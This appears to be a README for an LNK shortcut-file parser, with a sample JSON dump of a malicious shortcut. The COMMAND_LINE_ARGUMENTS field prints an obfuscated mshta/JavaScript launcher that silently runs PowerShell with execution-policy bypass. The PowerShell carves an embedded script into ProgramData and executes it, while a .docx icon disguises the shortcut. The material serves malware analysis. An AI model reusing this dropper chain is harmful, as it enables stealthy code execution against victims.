# LNK Parser

## Use
```python
python lnk_parser.py <%malware_lnk%>
```

## Output
```json
{
    "ShellLinkHeader": {
        "LinkFlags": [
            "01_HasLinkTargetIDList",
            "02_HasLinkInfo",
            "04_HasRelativePath",
            "06_HasArguments",
            "07_HasIconLocation",
            "08_IsUnicode",
            "18_EnableTargetMetadata"
        ],
        "FileAttributes": "FILE_ATTRIBUTE_ARCHIVE",
        "CreationTime": "2023-11-15 13:04:01.255468",
        "AccessTime": "2023-11-15 13:04:01.259439",
        "WriteTime": "2023-11-15 13:04:01.259439",
        "FileSize": 43520,
        "IconIndex": 0,
        "ShowCommand": "SW_SHOWNORMAL (1)"
    },
    "LinkTargetIDList": {
        "sListTargetIDList": "CLSID_MY_COMPUTER\\\\C:\\\\\\Windows\\\\System32\\\\mshta.exe",
        "IDLIST": [
            {
                "IDLIST": "Windows",
                "MFT_ENTRY_Sequence_Number": "0x0001267D / 0x0015",
                "CreateTime": "2019-12-07 09:03:46",
                "AccessTime": "2024-07-03 01:58:26",
                "ModifiedTime": "2024-07-03 01:58:26"
            },
            {
                "IDLIST": "System32",
                "MFT_ENTRY_Sequence_Number": "0x00013B42 / 0x0019",
                "CreateTime": "2019-12-07 09:03:46",
                "AccessTime": "2024-09-23 13:09:28",
                "ModifiedTime": "2024-09-23 13:09:28"
            },
            {
                "IDLIST": "mshta.exe",
                "MFT_ENTRY_Sequence_Number": "0x000B69A8 / 0x000F",
                "CreateTime": "2023-11-15 13:04:02",
                "AccessTime": "2023-11-15 13:04:02",
                "ModifiedTime": "2023-11-15 13:04:02"
            }
        ]
    },
    "LinkInfo": {
        "DriveType": "DRIVE_FIXED",
        "DriveSerialNumber": "6E63-26D3",
        "Data": "",
        "LocalBasePath": "C:\\Windows\\System32\\mshta.exe"
    },
    "StringData": {
        "NameString": null,
        "RELATIVE_PATH": "..\\..\\..\\Windows\\System32\\mshta.exe",
        "WORKING_DIR": "",
        "COMMAND_LINE_ARGUMENTS": "javascript:v=\" -Encoding Byte;sc \";s=\"a=new Ac\"+\"tiveXObject('WSc\"+\"ript.Shell');a.Run(c,0,true);close();\";c=\"powe\"+\"rshell -ep bypass -c $t=0x1be8;$k = Get-ChildItem *.lnk | where-object {$_.length -eq $t} | Select-Object -ExpandProperty Name;if($k.count -eq 0){$k=Get-ChildItem $env:T\"+\"EMP\\\\*\\\\*.lnk | where-object{$_.length -eq $t};};$w='c:\\\\programdata\\\\d.ps1';$f=gc $k\"+v+\"$w ([byte[]]($f | sel\"+\"ect -Skip 0x094a)) -Force\"+v+\"c:\\\\programdata\\\\b21111 0;po\"+\"wersh\"+\"ell -ep bypass -f $w;\";eval(s);",
        "ICON_LOCATION": ".docx"
    },
    "ExtraData": {
        "DataBlocks": [
            "06_KnownFolderDataBlock",
            "07_PropertyStoreDataBlock",
            "09_SpecialFolderDataBlock",
            "10_TrackerDataBlock"
        ],
        "MachineID": "jooyoung",
        "MacAddress": "50:B7:C3:96:87:F1",
        "FileDroid": "EACBF740-7D62-11EF-BF18-50B7C39687F1",
        "VolumeDroid": "67ABD1AA-3D2A-42AB-BF95-7B591D0F4B1F",
        "FileDroidBirth": "EACBF740-7D62-11EF-BF18-50B7C39687F1",
        "VolumeDroidBirth": "67ABD1AA-3D2A-42AB-BF95-7B591D0F4B1F"
    }
}
```